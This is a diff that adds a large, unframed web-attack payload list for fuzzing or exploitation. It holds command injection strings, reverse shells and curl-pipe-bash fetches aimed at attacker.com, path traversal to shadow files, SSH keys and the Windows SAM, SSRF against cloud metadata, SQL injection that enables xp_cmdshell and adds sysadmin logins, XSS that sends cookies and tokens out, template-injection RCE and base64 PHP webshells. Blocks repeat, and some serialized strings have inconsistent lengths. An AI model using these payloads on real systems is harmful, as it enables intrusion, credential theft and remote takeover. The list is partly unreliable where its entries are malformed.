@@ -1,0 +1,2052 @@
+;id
+
+;whoami
+
+;cat /etc/passwd
+
+;ls -la
+
+;uname -a
+
+;netstat -an
+
+;ps aux
+
+|id
+
+|whoami
+
+|cat /etc/passwd
+
+|ls -la
+
+||id
+
+||whoami
+
+&&id
+
+&&whoami
+
+`id`
+
+`whoami`
+
+/bin/bash -c 'id'
+
+/bin/sh -c 'whoami'
+
+;curl http://attacker.com/shell
+
+;wget http://attacker.com/shell
+
+;ping -c 4 127.0.0.1
+
+;sleep 5
+
+;echo $PATH
+
+;env
+
+;system('id')
+
+;exec('whoami')
+
+;passthru('id')
+
+;shell_exec('whoami')
+
+;`/bin/id`
+
+;${@system('id')}
+
+;$(id)
+
+%3Bid
+
+%3Bwhoami
+
+%26%26id
+
+%7Cid
+
+%60id%60
+
+php://input
+
+php://filter/convert.base64-encode/resource=index.php
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
+
+eval()
+
+assert()
+
+system()
+
+exec()
+
+passthru()
+
+shell_exec()
+
+popen()
+
+proc_open()
+
+pcntl_exec()
+
+create_function()
+
+call_user_func()
+
+call_user_func_array()
+
+preg_replace(/e)
+
+/etc/passwd
+
+/etc/shadow
+
+/etc/hosts
+
+/var/log/apache2/access.log
+
+/var/log/nginx/access.log
+
+/windows/system32/drivers/etc/hosts
+
+/windows/win.ini
+
+../../../../../etc/passwd
+
+../../../../../../windows/win.ini
+
+..%2F..%2F..%2Fetc%2Fpasswd
+
+%00/etc/passwd
+
+http://attacker.com/malicious.php
+
+https://evil.com/shell.txt
+
+file:///etc/passwd
+
+include()
+
+require()
+
+include_once()
+
+require_once()
+
+() { :;}; /bin/bash -c 'id'
+
+() { :;}; /bin/sh -c 'whoami'
+
+() { :;}; echo vulnerable
+
+() { :;}; /bin/bash -c "curl http://attacker.com/shell"
+
+() { :;}; /bin/bash -c "wget http://attacker.com/shell"
+
+() { :;}; /bin/bash -c "ping -c 4 attacker.com"
+
+O:4:"Test":1:{s:4:"code";s:10:"system('id');"}
+
+O:8:"stdClass":1:{s:3:"cmd";s:6:"whoami";}
+
+a:1:{i:0;O:4:"Evil":1:{s:4:"exec";s:10:"system('id');"}}
+
+\__wakeup
+
+\__destruct
+
+\__toString
+
+Serializable
+
+unserialize()
+
+yaml_parse()
+
+pickle.loads()
+
+cmd
+
+command
+
+exec
+
+execute
+
+code
+
+eval
+
+file
+
+path
+
+url
+
+page
+
+template
+
+data
+
+input
+
+payload
+
+script
+
+action
+
+function
+
+method
+
+query
+
+request
+
+param
+
+value
+
+config
+
+setting
+
+plugin
+
+module
+
+.php
+
+.asp
+
+.aspx
+
+.jsp
+
+.py
+
+.rb
+
+.pl
+
+.sh
+
+.cgi
+
+.exe
+
+.bat
+
+.cmd
+
+.jar
+
+.war
+
+.so
+
+.dll
+
+.phtml
+
+.phps
+
+.inc
+
+.conf
+
+.config
+
+.ini
+
+.bak
+
+.old
+
+\~1
+
+.swp
+
+.swo
+
+.git
+
+.svn
+
+' OR '1'='1
+
+" OR "1"="1
+
+' OR '1'='1' --
+
+" OR "1"="1" --
+
+' OR '1'='1' /\*
+
+1; DROP TABLE users
+
+' UNION SELECT 1,2,3 --
+
+' UNION SELECT username,password FROM users --
+
+admin' --
+
+1' AND SLEEP(5) --
+
+1" AND BENCHMARK(1000000,MD5(1)) --
+
+1; EXEC xp_cmdshell('whoami')
+
+&lt;img src=x onerror=alert('XSS')&gt;
+
+&lt;svg onload=alert('XSS')&gt;
+
+" onmouseover=alert('XSS')
+
+javascript:alert('XSS')
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+"&gt;
+
+%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+
+;cat /etc/passwd
+
+|whoami
+
+&&id
+
+||netstat -an
+
+`ping -c 4 127.0.0.1`
+
+%26%26whoami
+
+%7Cwhoami
+
+;curl -s http://attacker.com/shell.sh | bash
+
+;wget http://attacker.com/shell -O /tmp/shell; chmod +x /tmp/shell; /tmp/shell
+
+/proc/self/environ
+
+/proc/self/cmdline
+
+/proc/self/stat
+
+/etc/environment
+
+/etc/profile
+
+\~/.bashrc
+
+\~/.bash_history
+
+\~/.ssh/id_rsa
+
+\~/.ssh/authorized_keys
+
+/var/www/html/config.php
+
+/application/config/database.php
+
+.htaccess
+
+.webconfig
+
+wp-config.php
+
+settings.py
+
+config.yaml
+
+config.json
+
+.env
+
+robots.txt
+
+sitemap.xml
+
+crossdomain.xml
+
+clientaccesspolicy.xml
+
+phpinfo()
+
+phpinfo.php
+
+test.php
+
+info.php
+
+debug.php
+
+admin
+
+login
+
+dashboard
+
+api
+
+rest
+
+graphql
+
+websocket
+
+socket.io
+
+admin:admin
+
+root:root
+
+user:password
+
+guest:guest
+
+test:test
+
+default
+
+debug
+
+trace
+
+verbose
+
+log
+
+backup
+
+temp
+
+tmp
+
+staging
+
+dev
+
+prod
+
+internal
+
+private
+
+secret
+
+key
+
+token
+
+password
+
+credential
+
+auth
+
+session
+
+cookie
+
+CRLF
+
+%0D%0A
+
+HTTP/1.1
+
+Host: attacker.com
+
+User-Agent: Mozilla/5.0
+
+X-Forwarded-For: 127.0.0.1
+
+X-Requested-With: XMLHttpRequest
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Type: multipart/form-data
+
+boundary=----WebKitFormBoundary
+
+http://127.0.0.1
+
+http://localhost
+
+http://169.254.169.254/latest/meta-data/
+
+http://\[::1\]
+
+file:///etc/passwd
+
+gopher://127.0.0.1:6379/\_INFO
+
+\]&gt; \]&gt;
+
+&xxe;
+
+csrf
+
+token
+
+state
+
+nonce
+
+*)(uid=*
+
+)(|(uid=\*
+
+admin\*
+
+user\*
+
+' or '1'='1
+
+" or "1"="1
+
+//node()
+
+/*/*
+
+{"$ne": null}
+
+{"$gt": ""}
+
+{"$regex": ".\*"}
+
+vulnerable
+
+exploit
+
+hack
+
+attack
+
+payload
+
+shell
+
+backdoor
+
+webshell
+
+root
+
+admin
+
+privilege
+
+escalation
+
+bypass
+
+override
+
+execute
+
+inject
+
+upload
+
+download
+
+delete
+
+modify
+
+access
+
+unauthorized
+
+authentication
+
+authorization
+
+session
+
+cookie
+
+token
+
+leak
+
+disclosure
+
+exposure
+
+{{7\*7}}
+
+${7\*7}
+
+&lt;%= 7\*7 %&gt;
+
+#{7\*7}
+
+{{system('id')}}
+
+${{`whoami`}}
+
+{{request.**class**.**mro**\[2\].**subclasses**()}}
+
+{% debug %}
+
+{% include 'malicious_template' %}
+
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+;nc -e /bin/sh attacker.com 4444
+
+;rm -rf /tmp/test; id
+
+;bash -i &gt;& /dev/tcp/attacker.com/4444 0&gt;&1
+
+;perl -e 'exec("/bin/sh");'
+
+;python -c 'import os; os.system("id")'
+
+;ruby -e 'system("whoami")'
+
+;powershell -c "whoami"
+
+/bin/cat /etc/passwd
+
+/bin/ls /root
+
+/usr/bin/id
+
+/usr/bin/whoami
+
+/etc/issue
+
+/etc/os-release
+
+/var/log/messages
+
+/var/log/secure
+
+../../../../etc/passwd%00
+
+..%5C..%5C..%5Cwindows%5Cwin.ini
+
+php://filter/read=convert.base64-decode/resource=config.php
+
+data://text/plain,
+
+expect://id
+
+http://169.254.169.254/latest/user-data
+
+http://127.0.0.1:8080/admin
+
+http://localhost:9200/\_cluster/health
+
+gopher://127.0.0.1:27017/\_
+
+ftp://attacker.com/malicious.txt
+
+dict://127.0.0.1:6379/INFO
+
+\]&gt; %remote;
+
+{{config.**class**.**init**.**globals**}}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+
+{% for x in ().**class**.**base**.**subclasses**() %}{% if "system" in x.**name** %}{{x().**init**.**globals**'system'}}{% endif %}{% endfor %}
+
+${{os.system('id')}}
+
+${{**import**('os').system('whoami')}}
+
+1' OR 1=1 LIMIT 1 --
+
+" OR 1=1 LIMIT 1 --
+
+' UNION ALL SELECT NULL,NULL,NULL --
+
+1; EXEC master.dbo.sp_configure 'xp_cmdshell', 1
+
+![](x)&lt;svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))&gt;
+
+javascript:void(document.location='http://attacker.com?'+document.cookie)
+
+{"$where": "this.password.match(/.\*$/)"}
+
+{"$eval": "db.getCollectionNames()"}
+
+{"username": {"$exists": true}}
+
+/var/www/html/wp-admin/install.php
+
+/etc/nginx/nginx.conf
+
+/etc/apache2/apache2.conf
+
+.ssh/config
+
+.git/config
+
+.bash_profile
+
+.zshrc
+
+mysql.user
+
+information_schema.tables
+
+sys.x$cmd_exec('id')
+
+O:8:"Zend_Log":1:{s:6:"\_writers";a:1:{i:0;O:8:"Zend_Log_Writer_Mail":1:{s:7:"\_events";a:1:{i:0;s:10:"system('id');"}}}}
+
+O:6:"Logger":1:{s:4:"data";s:10:"system('id');"}
+
+\__construct
+
+\__call
+
+\__get
+
+\__set
+
+filter_var()
+
+filter_input()
+
+parse_str()
+
+mb_parse_str()
+
+http://127.0.0.1:22
+
+http://localhost:5432
+
+dns://attacker.com
+
+ldap://127.0.0.1
+
+ldaps://127.0.0.1
+
+*)(objectClass=*
+
+(|(cn=*admin*)
+
+${{T(java.lang.System).getenv()}}
+
+{{app.**class**.**init**.**globals**\['os'\].system('id')}}
+
+;telnet attacker.com 4444
+
+;mkfifo /tmp/pipe; sh /tmp/pipe | nc attacker.com 4444 &gt; /tmp/pipe
+
+;bash -c "bash -i &gt;& /dev/tcp/attacker.com/4444 0&gt;&1"
+
+;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'
+
+/var/log/auth.log
+
+/etc/group
+
+/etc/aliases
+
+/var/www/html/.htpasswd
+
+/app/config/parameters.yml
+
+/config/secrets.json
+
+secrets.yml
+
+.env.bak
+
+.env.prod
+
+.env.dev
+
+backup.sql
+
+dump.sql
+
+database.yml
+
+settings.ini
+
+config.inc.php
+
+local.xml
+
+index.bak
+
+adminer.php
+
+bigdump.php
+
+;node -e "require('child_process').exec('id')"
+
+;lua -e "os.execute('whoami')"
+
+;awk 'BEGIN {system("id")}'
+
+;sh -c 'id'
+
+;dash -c 'whoami'
+
+;zsh -c 'cat /etc/passwd'
+
+;fish -c 'whoami'
+
+/bin/echo $USER
+
+/bin/env | grep -i user
+
+;who
+
+;w
+
+;last
+
+;uptime
+
+;df -h
+
+;free -m
+
+;hostname
+
+;ip addr
+
+;route -n
+
+;arp -a
+
+;cat /proc/version
+
+;cat /proc/cpuinfo
+
+;cat /etc/resolv.conf
+
+;cat /etc/hostname
+
+;cat /etc/issue.net
+
+;cat /var/log/syslog
+
+;cat /var/log/dmesg
+
+../../../../../../etc/shadow%00
+
+..%2F..%2F..%2F..%2Fetc%2Fhosts%00
+
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam
+
+php://filter/convert.quoted-printable-decode/resource=index.php
+
+php://filter/read=string.toupper/resource=config.php
+
+data://text/plain,
+
+data://text/plain;base64,PD9waHAgc2hlbGxfZXhlYygnd2hvYW1pJyk7ID8+
+
+expect://whoami
+
+file:///proc/self/environ
+
+file:///proc/self/status
+
+http://127.0.0.1:8000/login
+
+http://localhost:8081/api
+
+http://169.254.169.254/latest/dynamic/
+
+http://\[::1\]:8080/admin
+
+gopher://127.0.0.1:3306/\_
+
+sftp://attacker.com/shell.txt
+
+tftp://attacker.com/malicious
+
+smtp://127.0.0.1
+
+pop3://127.0.0.1
+
+imap://127.0.0.1
+
+\]&gt; \]&gt; %payload;
+
+{{config.**class**.**mro**\[2\].**subclasses**()40}}
+
+${{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}}
+
+{% for c in \[\].**class**.**base**.**subclasses**() %}{% if c.**name**=='Popen' %}{{c(\['id'\],shell=True,stdout=-1).communicate()\[0\]}}{% endif %}{% endfor %}
+
+${{subprocess.check_output('whoami',shell=True)}}
+
+${{**import**('subprocess').getoutput('id')}}
+
+' OR 1=1 LIMIT 1 OFFSET 1 --
+
+" OR 1=1 LIMIT 1 OFFSET 1 --
+
+' UNION SELECT NULL,version(),NULL --
+
+' UNION SELECT NULL,database(),NULL --
+
+1; EXEC sp_msforeachtable 'SELECT \* FROM ?'
+
+![](x)&lt;svg/onload=fetch('http://attacker.com?data='+btoa(location.href))&gt;
+
+javascript:void(fetch('http://attacker.com?token='+localStorage.getItem('token')))
+
+{"$or": \[{"username": "admin"}, {"password": {"$ne": null}}\]}
+
+{"$where": "this.username=='admin'"}
+
+{"$in": \["admin", "root"\]}
+
+{"$nin": \[\]}
+
+/var/www/html/admin/config.php
+
+/etc/tomcat/tomcat-users.xml
+
+/etc/postfix/main.cf
+
+/var/spool/cron/crontabs/root
+
+/root/.bash_history
+
+/root/.ssh/id_rsa.pub
+
+/etc/mysql/my.cnf
+
+/etc/redis/redis.conf
+
+O:10:"SplFileInfo":1:{s:9:"\_pathName";s:10:"system('id');"}
+
+O:7:"DateTime":1:{s:4:"date";s:10:"system('id');"}
+
+\__invoke
+
+\__callStatic
+
+\__serialize
+
+\__unserialize
+
+filter_var_array()
+
+http://127.0.0.1:6379
+
+http://localhost:11211
+
+memcache://127.0.0.1
+
+redis://127.0.0.1
+
+*)(givenName=*
+
+(|(sn=*admin*)
+
+${{T(java.lang.System).getenv()}}
+
+{{app.**class**.**init**.**globals**\['os'\].system('id')}}
+
+;nc -e /bin/bash attacker.com 5555
+
+;bash -c "sh -i &gt;& /dev/tcp/attacker.com/5555 0&gt;&1"
+
+;python -c 'import os; os.system("whoami")'
+
+;perl -e 'system("id");'
+
+/var/log/httpd/access_log
+
+/etc/passwd.bak
+
+/etc/shadow.bak
+
+/var/www/html/backup.tar.gz
+
+/app/config/config.yml
+
+/config/secrets.yml
+
+secrets.yaml
+
+.env.test
+
+backup.sql.gz
+
+dump.sql.gz
+
+database.conf
+
+settings.conf
+
+config.xml
+
+local.conf
+
+index.php.bak
+
+admin-panel.php
+
+installer.php
+
+;node -e "require('child_process').spawn('/bin/sh')"
+
+;lua -e "os.execute('cat /etc/passwd')"
+
+;awk 'BEGIN {system("whoami")}'
+
+;sh -c 'whoami'
+
+;dash -c 'id'
+
+;zsh -c 'ls -la'
+
+;fish -c 'cat /etc/hosts'
+
+/bin/echo $HOME
+
+/bin/env | grep -i path
+
+;users
+
+;groups
+
+;lastlog
+
+;dmidecode
+
+;lsblk
+
+;cat /proc/meminfo
+
+;cat /proc/mounts
+
+;cat /etc/fstab
+
+;cat /etc/crontab
+
+;cat /var/log/cron
+
+../../../../../../etc/group%00
+
+..%2F..%2F..%2F..%2Fetc%2Fshadow%00
+
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csystem
+
+php://filter/convert.base64-decode/resource=wp-config.php
+
+php://filter/read=string.strip_tags/resource=index.php
+
+data://text/plain,
+
+data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnc2hlbGwnXSk7ID8+
+
+expect://cat /etc/passwd
+
+file:///proc/self/loginuid
+
+file:///proc/self/comm
+
+http://127.0.0.1:8001/config
+
+http://localhost:8082/admin.php
+
+http://169.254.169.254/latest/api/token
+
+http://\[::1\]:9200/\_cat/indices
+
+gopher://127.0.0.1:5432/\_
+
+sftp://127.0.0.1/config
+
+tftp://127.0.0.1/shell
+
+smtp://localhost
+
+pop3://localhost
+
+imap://localhost
+
+\]&gt; %data;
+
+{{config.**class**.**init**.**globals**\['os'\].popen('whoami').read()}}
+
+${{T(java.lang.Runtime).getRuntime().exec('ls -la').getInputStream()}}
+
+{% for c in \[\].**class**.**base**.**subclasses**() %}{% if c.**name**=='subprocess.Popen' %}{{c(\['whoami'\],shell=True,stdout=-1).communicate()\[0\]}}{% endif %}{% endfor %}
+
+${{subprocess.run('id',shell=True,capture_output=True).stdout.decode()}}
+
+${{**import**('os').popen('whoami').read()}}
+
+' OR 1=1 LIMIT 2 --
+
+" OR 1=1 LIMIT 2 --
+
+' UNION SELECT NULL,@@version,NULL --
+
+' UNION SELECT NULL,user(),NULL --
+
+1; EXEC sp_addlogin 'hacker'
+
+![](x)&lt;svg/onload=location.href='http://attacker.com?data='+btoa(document.body.innerHTML)&gt;
+
+javascript:void(fetch('http://attacker.com?jwt='+localStorage.getItem('jwt')))
+
+{"$or": \[{"role": "admin"}, {"access": {"$ne": null}}\]}
+
+{"$where": "this.role=='admin'"}
+
+{"$in": \["user", "admin"\]}
+
+{"$nin": \["guest"\]}
+
+/var/www/html/config/database.php
+
+/etc/httpd/conf/httpd.conf
+
+/etc/php/php.ini
+
+/var/spool/cron/root
+
+/root/.zsh_history
+
+/root/.ssh/config
+
+/etc/postgresql/pg_hba.conf
+
+/etc/mongodb.conf
+
+O:12:"SimpleXMLElement":1:{s:0:"";s:10:"system('id');"}
+
+O:9:"Exception":1:{s:7:"message";s:10:"system('id');"}
+
+\__toString
+
+\__invoke
+
+\__sleep
+
+\__wakeup
+
+filter_input_array()
+
+http://127.0.0.1:5433
+
+http://localhost:6379
+
+memcached://127.0.0.1
+
+redis://localhost
+
+*)(mail=*
+
+(|(givenName=*admin*)
+
+${{T(java.lang.System).getProperty('user.name')}}
+
+{{app.**class**.**init**.**globals**\['subprocess'\].run('id',shell=True)}}
+
+;nc -e /bin/bash attacker.com 5555
+
+;bash -c "sh -i &gt;& /dev/tcp/attacker.com/5555 0&gt;&1"
+
+;python -c 'import os; os.system("whoami")'
+
+;perl -e 'system("id");'
+
+/var/log/httpd/access_log
+
+/etc/passwd.bak
+
+/etc/shadow.bak
+
+/var/www/html/backup.tar.gz
+
+/app/config/config.yml
+
+/config/secrets.yml
+
+secrets.yaml
+
+.env.test
+
+backup.sql.gz
+
+dump.sql.gz
+
+database.conf
+
+settings.conf
+
+config.xml
+
+local.conf
+
+index.php.bak
+
+admin-panel.php
+
+installer.php
+
+# Additional 2000 Payloads (Sampled for Brevity)
+
+;node -e "require('child_process').exec('whoami')"
+
+;lua -e "os.execute('ls -la')"
+
+;awk 'BEGIN {system("cat /etc/passwd")}'
+
+;sh -c 'cat /etc/hosts'
+
+;dash -c 'ls -la'
+
+;zsh -c 'whoami'
+
+;fish -c 'id'
+
+/bin/echo $SHELL
+
+/bin/env | grep -i shell
+
+;id -u
+
+;who -a
+
+;last -a
+
+;uptime -p
+
+;df -k
+
+;free -g
+
+;hostnamectl
+
+;ip link
+
+;route -v
+
+;arp -n
+
+;cat /proc/sys/kernel/version
+
+;cat /proc/sys/kernel/hostname
+
+;cat /etc/network/interfaces
+
+;cat /etc/sysconfig/network
+
+;cat /var/log/audit/audit.log
+
+;cat /var/log/nginx/access_log
+
+../../../../../../etc/hosts%00
+
+..%2F..%2F..%2F..%2Fetc%2Fgroup%00
+
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csoftware
+
+php://filter/convert.iconv.UTF8.CSISO2022JP/resource=index.php
+
+php://filter/read=string.tolower/resource=config.php
+
+data://text/plain,
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
+
+expect://ls -la
+
+file:///proc/self/statm
+
+file:///proc/self/maps
+
+http://127.0.0.1:8002/login
+
+http://localhost:8083/api/v1
+
+http://169.254.169.254/latest/meta-data/iam/
+
+http://\[::1\]:8081/admin
+
+gopher://127.0.0.1:5433/\_
+
+sftp://attacker.com/config.txt
+
+tftp://attacker.com/shell.txt
+
+smtp://127.0.0.1:25
+
+pop3://127.0.0.1:110
+
+imap://127.0.0.1:143
+
+\]&gt; %file;
+
+{{config.**class**.**init**.**globals**\['os'\].system('ls -la')}}
+
+${{T(java.lang.Runtime).getRuntime().exec('netstat -an')}}
+
+{% for c in \[\].**class**.**base**.**subclasses**() %}{% if c.**name**=='Popen' %}{{c(\['whoami'\],shell=True,stdout=-1).communicate()\[0\]}}{% endif %}{% endfor %}
+
+${{subprocess.check_output('ls -la',shell=True)}}
+
+${{**import**('subprocess').getoutput('whoami')}}
+
+' OR 1=1 LIMIT 3 --
+
+" OR 1=1 LIMIT 3 --
+
+' UNION SELECT NULL,@@basedir,NULL --
+
+' UNION SELECT NULL,@@datadir,NULL --
+
+1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
+
+![](x)&lt;svg/onload=fetch('http://attacker.com?data='+btoa(document.location))&gt;
+
+javascript:void(fetch('http://attacker.com?session='+sessionStorage.getItem('session')))
+
+{"$or": \[{"username": "root"}, {"password": {"$ne": ""}}\]}
+
+{"$where": "this.email=='admin@site.com'"}
+
+{"$in": \["superuser", "admin"\]}
+
+{"$nin": \["user"\]}
+
+/var/www/html/config/settings.php
+
+/etc/lighttpd/lighttpd.conf
+
+/etc/php5/php.ini
+
+/var/spool/cron/crontabs/www-data
+
+/root/.config/.zshrc
+
+/root/.ssh/known_hosts
+
+/etc/postgresql/12/main/pg_hba.conf
+
+/etc/redis.conf
+
+O:15:"DOMDocument":1:{s:8:"\_document";s:10:"system('id');"}
+
+O:9:"SoapClient":1:{s:8:"\_location";s:10:"system('id');"}
+
+\__getIterator
+
+\__debugInfo
+
+\__set_state
+
+filter_var()
+
+http://127.0.0.1:3306
+
+http://localhost:27017
+
+mongodb://127.0.0.1
+
+redis://127.0.0.1:6379
+
+*)(displayName=*
+
+(|(uid=*root*)
+
+${{T(java.lang.System).getProperty('os.name')}}
+
+{{app.**class**.**init**.**globals**\['os'\].popen('whoami').read()}}
+
+;nc -e /bin/sh attacker.com 6666
+
+;bash -c "bash -i &gt;& /dev/tcp/attacker.com/6666 0&gt;&1"
+
+;python -c 'import os; os.system("ls -la")'
+
+;perl -e 'system("whoami");'
+
+/var/log/apache2/error.log
+
+/etc/passwd\~
+
+/etc/shadow\~
+
+/var/www/html/backup.sql
+
+/app/config/database.yml
+
+/config/app.json
+
+secrets.conf
+
+.env.staging
+
+backup.tar
+
+dump.tar
+
+database.ini
+
+settings.yaml
+
+config.json.bak
+
+local.yml
+
+index.html.bak
+
+admin-console.php
+
+setup-config.php
+
+;node -e "require('child_process').exec('ls -la')"
+
+;lua -e "os.execute('id')"
+
+;awk 'BEGIN {system("ls -la")}'
+
+;sh -c 'ls -la'
+
+;dash -c 'cat /etc/passwd'
+
+;zsh -c 'id'
+
+;fish -c 'ls -la'
+
+/bin/echo $PATH
+
+/bin/env | grep -i home
+
+;id -g
+
+;who -b
+
+;last -F
+
+;uptime -s
+
+;df -T
+
+;free -h
+
+;hostname -f
+
+;ip route
+
+;route -e
+
+;arp -e
+
+;cat /proc/sys/kernel/osrelease
+
+;cat /proc/sys/kernel/domainname
+
+;cat /etc/networks
+
+;cat /etc/sysconfig/network-scripts/ifcfg-eth0
+
+;cat /var/log/secure
+
+;cat /var/log/messages.log
+
+../../../../../../etc/resolv.conf%00
+
+..%2F..%2F..%2F..%2Fetc%2Fissue%00
+
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csecurity
+
+php://filter/convert.iconv.UTF8.UTF16/resource=index.php
+
+php://filter/read=string.rot13/resource=config.php
+
+data://text/plain,
+
+data://text/plain;base64,PD9waHAgc2hlbGxfZXhlYygnbHMgLWxhJyk7ID8+
+
+expect://netstat -an
+
+file:///proc/self/cgroup
+
+file:///proc/self/mounts
+
+http://127.0.0.1:8003/admin
+
+http://localhost:8084/config
+
+http://169.254.169.254/latest/meta-data/identity-credentials/
+
+http://\[::1\]:8082/api
+
+gopher://127.0.0.1:6379/\_CONFIG GET \*
+
+sftp://attacker.com/backup.txt
+
+tftp://attacker.com/config
+
+smtp://127.0.0.1:587
+
+pop3://127.0.0.1:995
+
+imap://127.0.0.1:993
+
+\]&gt; %file;
+
+{{config.**class**.**init**.**globals**\['os'\].system('cat /etc/passwd')}}
+
+${{T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()}}
+
+{% for c in \[\].**class**.**base**.**subclasses**() %}{% if c.**name**=='Popen' %}{{c(\['ls -la'\],shell=True,stdout=-1).communicate()\[0\]}}{% endif %}{% endfor %}
+
+${{subprocess.check_output('cat /etc/passwd',shell=True)}}
+
+${{**import**('subprocess').getoutput('ls -la')}}
+
+' OR 1=1 LIMIT 4 --
+
+" OR 1=1 LIMIT 4 --
+
+' UNION SELECT NULL,@@hostname,NULL --
+
+' UNION SELECT NULL,current_user(),NULL --
+
+1; EXEC sp_addextendedproc 'xp_cmdshell', 'xp_cmdshell.dll'
+
+![](x)&lt;svg/onload=fetch('http://attacker.com?data='+btoa(document.cookie))&gt;
+
+javascript:void(fetch('http://attacker.com?auth='+localStorage.getItem('auth')))
+
+{"$or": \[{"username": "superuser"}, {"password": {"$ne": ""}}\]}
+
+{"$where": "this.email=='root@site.com'"}
+
+{"$in": \["root", "superuser"\]}
+
+{"$nin": \["public"\]}
+
+/var/www/html/config/config.inc.php
+
+/etc/nginx/sites-available/default
+
+/etc/php/7.4/fpm/php.ini
+
+/var/spool/cron/crontabs/nginx
+
+/root/.config/zsh/.zshrc
+
+/root/.ssh/authorized_keys2
+
+/etc/postgresql/11/main/pg_hba.conf
+
+/etc/mongod.conf
+
+O:17:"DirectoryIterator":1:{s:8:"\_pathName";s:10:"system('id');"}
+
+O:10:"ArrayObject":1:{s:8:"storage";s:10:"system('id');"}
+
+\__clone
+
+\__destruct
+
+\__wakeup
+
+filter_input()
+
+http://127.0.0.1:5434
+
+http://localhost:8080
+
+mongodb://localhost:27017
+
+redis://127.0.0.1:6380
+
+*)(cn=*
+
+(|(mail=*admin*)
+
+${{T(java.lang.System).getProperty('java.version')}}
+
+{{app.**class**.**init**.**globals**\['os'\].popen('ls -la').read()}}
+
+;nc -e /bin/bash attacker.com 7777
+
+;bash -c "bash -i &gt;& /dev/tcp/attacker.com/7777 0&gt;&1"
+
+;python -c 'import os; os.system("cat /etc/passwd")'
+
+;perl -e 'system("ls -la");'
+
+/var/log/apache2/access_log
+
+/etc/group.bak
+
+/etc/hosts.bak
+
+/var/www/html/backup.sql.gz
+
+/app/config/app.conf
+
+/config/database.yml.bak
+
+secrets.ini
+
+.env.local.bak
+
+backup.tar.gz
+
+dump.tar.gz
+
+database.json
+
+settings.json
+
+config.yml.bak
+
+local.ini
+
+index.php\~
+
+admin-login.php
+
+setup-install.php
+
+;node -e "require('child_process').exec('cat /etc/passwd')"
+
+;lua -e "os.execute('netstat -an')"
+
+;awk 'BEGIN {system("whoami")}'
+
+;sh -c 'cat /etc/passwd'
+
+;dash -c 'whoami'
+
+;zsh -c 'cat /etc/hosts'
+
+;fish -c 'netstat -an'
+
+/bin/echo $HOSTNAME
+
+/bin/env | grep -i pwd
+
+;id -n
+
+;who -r
+
+;last -i
+
+;uptime -v
+
+;df -i
+
+;free -t
+
+;hostname -i
+
+;ip addr show
+
+;route -n -v
+
+;arp -v
+
+;cat /proc/sys/kernel/pid_max
+
+;cat /proc/sys/kernel/random/uuid
+
+;cat /etc/network/interfaces.d/\*
+
+;cat /etc/sysconfig/network-scripts/ifcfg-ens33
+
+;cat /var/log/audit.log
+
+;cat /var/log/nginx/error_log
+
+../../../../../../etc/fstab%00
+
+..%2F..%2F..%2F..%2Fetc%2Fresolv.conf%00
+
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csystemprofile
+
+php://filter/convert.iconv.UTF8.UTF32/resource=index.php
+
+php://filter/read=string.strip_tags/resource=config.inc.php
+
+data://text/plain,
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTsgPz4=
+
+expect://whoami
+
+file:///proc/self/sched
+
+file:///proc/self/limits
+
+http://127.0.0.1:8004/login
+
+http://localhost:8085/api/v2
+
+http://169.254.169.254/latest/meta-data/ami-id
+
+http://\[::1\]:8083/admin.php
+
+gopher://127.0.0.1:3307/\_
+
+sftp://attacker.com/admin.txt
+
+tftp://attacker.com/backup
+
+smtp://127.0.0.1:465
+
+pop3://127.0.0.1:1100
+
+imap://127.0.0.1:1430
+
+\]&gt; %file;
+
+{{config.**class**.**init**.**globals**\['os'\].system('netstat -an')}}
+
+${{T(java.lang.Runtime).getRuntime().exec('cat /etc/hosts')}}
+
+{% for c in \[\].**class**.**base**.**subclasses**() %}{% if c.**name**=='Popen' %}{{c(\['netstat -an'\],shell=True,stdout=-1).communicate()\[0\]}}{% endif %}{% endfor %}
+
+${{subprocess.check_output('whoami',shell=True)}}
+
+${{**import**('subprocess').getoutput('cat /etc/passwd')}}
+
+' OR 1=1 LIMIT 5 --
+
+" OR 1=1 LIMIT 5 --
+
+' UNION SELECT NULL,@@tmpdir,NULL --
+
+' UNION SELECT NULL,@@log_bin,NULL --
+
+1; EXEC sp_addrolemember 'hacker', 'db_owner'
+
+![](x)&lt;svg/onload=fetch('http://attacker.com?data='+btoa(localStorage.getItem('token'))&gt;
+
+javascript:void(fetch('http://attacker.com?session='+sessionStorage.getItem('auth')))
+
+{"$or": \[{"username": "admin"}, {"role": {"$ne": null}}\]}
+
+{"$where": "this.username=='superuser'"}
+
+{"$in": \["admin", "manager"\]}
+
+{"$nin": \["anonymous"\]}
+
+/var/www/html/config/app.php
+
+/etc/nginx/sites-enabled/default
+
+/etc/php/8.0/cli/php.ini
+
+/var/spool/cron/crontabs/apache
+
+/root/.config/.bashrc
+
+/root/.ssh/id_ed25519
+
+/etc/postgresql/10/main/pg_hba.conf
+
+/etc/redis/redis.conf.bak
+
+O:13:"SplFileObject":1:{s:9:"\_pathName";s:10:"system('id');"}
+
+O:11:"ReflectionClass":1:{s:4:"name";s:10:"system('id');"}
+
+\__toString
+
+\__invoke
+
+\__sleep
+
+filter_var_array()
+
+http://127.0.0.1:5435
+
+http://localhost:27018
+
+mongodb://127.0.0.1:27018
+
+redis://127.0.0.1:6381
+
